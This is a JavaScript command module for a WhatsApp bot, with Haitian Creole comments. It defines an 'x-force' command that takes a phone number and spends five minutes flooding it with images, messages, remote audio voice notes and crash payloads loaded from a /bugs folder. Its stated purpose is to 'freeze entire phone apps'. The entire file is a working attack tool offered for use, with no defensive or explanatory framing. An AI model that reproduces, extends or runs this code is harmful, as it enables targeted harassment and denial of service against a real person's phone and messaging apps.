const config = require('../config');

cmd({
  pattern: 'x-force',
  desc: 'Freeze entire phone apps by flooding WhatsApp and other payloads',
  category: 'bug',
  react: '⚡',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'x-force') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}x-force <number>`
      }, { quoted: mek });
    }

    const blocked = ['13058962443', '50942241547'];
    if (blocked.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.',
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 No payloads found in /bugs folder.',
      }, { quoted: mek });
    }

    // ⚡ Anonse kòmanse atak
    await bot.sendMessage(from, {
      text: `⚡ *X-FORCE Launched!*\n🎯 Target: +${targetNumber}\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 5 minutes`,
    }, { quoted: mek });

    const endTime = Date.now() + 5 * 60 * 1000; // 5 minit

    async function sendPayload(msg) {
      // Voye imaj + caption
      await bot.sendMessage(targetJid, {
        image: { url: path.resolve(__dirname, '../media/1.png') },
        caption: `⚡ ${msg}\n_BY X-FORCE ATTACK_`,
      });

      // Voye mesaj tèks
      await bot.sendMessage(targetJid, { text: msg });

      // Voye audio pou pwovoke plis chay sou telefòn
      await bot.sendMessage(targetJid, {
        audio: { url: 'https://files.catbox.moe/8e7mkq.mp4' },
        mimetype: 'audio/mp4',
        ptt: true,
      });
    }

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          delete require.cache[require.resolve(payloadPath)];
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'function') {
            const result = await bugPayload(m, bot);
            if (Array.isArray(result)) {
              for (const line of result) {
                await sendPayload(line);
                await new Promise(res => setTimeout(res, 400));
              }
            } else if (typeof result === 'string') {
              await sendPayload(result);
              await new Promise(res => setTimeout(res, 400));
            }
          }
        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }
      }
    }

    await bot.sendMessage(from, {
      text: `✅ *X-FORCE Attack Completed* on +${targetNumber}`,
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});